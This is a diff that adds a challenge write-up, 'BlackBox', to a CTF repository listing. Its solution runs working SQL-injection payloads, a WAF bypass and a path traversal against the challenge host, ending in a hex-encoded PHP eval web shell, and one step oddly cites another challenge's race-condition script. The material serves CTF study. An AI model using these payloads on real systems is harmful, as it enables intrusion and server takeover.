@@ -493,6 +493,50 @@ $ curl http://1.2.3.4/admin/thefl4g.txt
 * [CTF/Writeup/HITCON2014/LEENODE](https://wiki.mma.club.uec.ac.jp/CTF/Writeup/HITCON2014/LEENODE)  
 
 
+## **BlackBox**
+
+Solved: **0 / 12**  
+Difficulty: **★★★★**  
+Tag: **GrayBox**, **PHP**, **JAVA**, **mod_jk**, **H2**, **SQL Injection**  
+
+#### Idea  
+
+* Multilayered architecture vulnerability  
+* Default mod_jk setting leads to directory travesal  
+* WAF bypassed by incorrect BASE64 and URLENCODE  
+* SQL Injection on H2 Database  
+* Execute Code by using  H2 SQL Injection  
+
+#### Source Code  
+
+* [here](wctf-2016/BlackBox)  
+
+#### Solution  
+
+* Run [exploit.py](ais3-final-2015/sqlpwn/exploit.py) to win race condition
+
+* Get source code  
+   ```text
+   http://1.2.3.4/login/..;/
+   ```
+
+* Review code and find a way to bypass WAF  
+   ```bash
+   $ curl "http://1.2.3.4/news/?id=1~~~~' and 1=2 union select null,null,version(),null--"
+   $ curl "http://1.2.3.4/news/?id=1~~~~' and 1=2 union select null,null,file_read('/etc/apache2/sites-enabled/000-default.conf'),null--"
+   ```  
+
+* Write shell  
+    ```bash
+    $ curl "http://1.2.3.4/news/?id=1~~~~' and 1=2 union select null,null,file_write('3c3f706870206576616c28245f504f53545b6363635d293b3f3e', '/www/write_shell_here_=P/.a.php'),null--"
+    $ curl "http://1.2.3.4/write_shell_here_=P/.a.php" -d 'phpinfo();'
+    ```
+
+#### Write Ups  
+
+    TBD
+
+
 
 ## **SQLPWN**  
 
